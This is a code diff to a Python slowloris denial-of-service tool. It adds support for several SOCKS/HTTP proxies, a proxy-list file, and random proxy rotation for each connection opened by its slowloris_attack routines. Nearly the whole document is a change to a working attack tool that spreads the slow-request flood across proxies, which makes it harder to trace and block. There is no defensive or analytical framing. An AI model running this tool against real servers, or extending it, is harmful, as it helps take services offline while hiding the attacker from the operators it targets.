@@ -32,8 +32,21 @@ parser.add_argument('--write-rate', type=float, default=0.05, metavar='SECONDS',
 parser.add_argument('-H', '--header', action='append', default=[], help='add custom header')
 parser.add_argument('-X', '--request', default='GET', help='request method (default: %(default)s)')
 parser.add_argument('-d', '--data', action='append', default=[])
-parser.add_argument('-x', '--proxy')
+parser.add_argument('-x', '--proxy', action='append', default=[], help="(example: socks5://...)")
+parser.add_argument('--proxy-file', metavar="FILE", help="load all line separated proxies from FILE")
 args = parser.parse_args()
+
+args.proxy = set([p.strip() for p in args.proxy])
+
+if args.proxy_file:
+    with open(args.proxy_file) as f:
+        for line in f:
+            line = line.strip()
+            args.proxy.add(line)
+
+args.proxy = list(args.proxy)
+
+[Proxy.from_url(p) for p in args.proxy] # check if all proxies are valid
 
 url = urllib.parse.urlparse(args.url)
 if url.scheme not in ['', 'http', 'https']:
@@ -98,15 +111,15 @@ async def slowloris_readuntil(reader, sep, rate):
         await asyncio.sleep(rate)
 
 @slowloris_timeout(args.timeout)
-async def slowloris_open(host, port, https, proxy):
+async def slowloris_open(host, port, https, proxies):
     ssl_ctx = None
     if https:
         ssl_ctx = ssl.create_default_context()
 
-    if proxy is None:
+    if len(proxies) == 0:
         return await asyncio.open_connection(host, port, ssl=ssl_ctx)
 
-    proxy = Proxy.from_url(proxy)
+    proxy = Proxy.from_url(random.choice(proxies))
     sock = await proxy.connect(dest_host=host, dest_port=port, timeout=99999999)
     return await asyncio.open_connection(host=None, port=None, sock=sock, ssl=ssl_ctx, server_hostname=host if https else None)
 
@@ -120,8 +133,8 @@ async def slowloris_attack_loop(*args, **kwargs):
             else:
                 print(f'{e.__class__.__name__}')
 
-async def slowloris_attack(host, port, read_rate, write_rate, https, path, headers_list, proxy, interval, request_method, data_list):
-    reader, writer = await slowloris_open(host, port, https, proxy)
+async def slowloris_attack(host, port, read_rate, write_rate, https, path, headers_list, proxies, interval, request_method, data_list):
+    reader, writer = await slowloris_open(host, port, https, proxies)
     headers = DEFAULT_HEADERS
     headers['Host'] = host
     headers['User-Agent'] = random.choice(USER_AGENTS)
@@ -192,7 +205,7 @@ asyncio.run(run(
     https=https,
     path=url.path,
     headers_list=args.header,
-    proxy=args.proxy,
+    proxies=args.proxy,
     interval=args.interval,
     request_method=args.request,
     data_list=args.data,
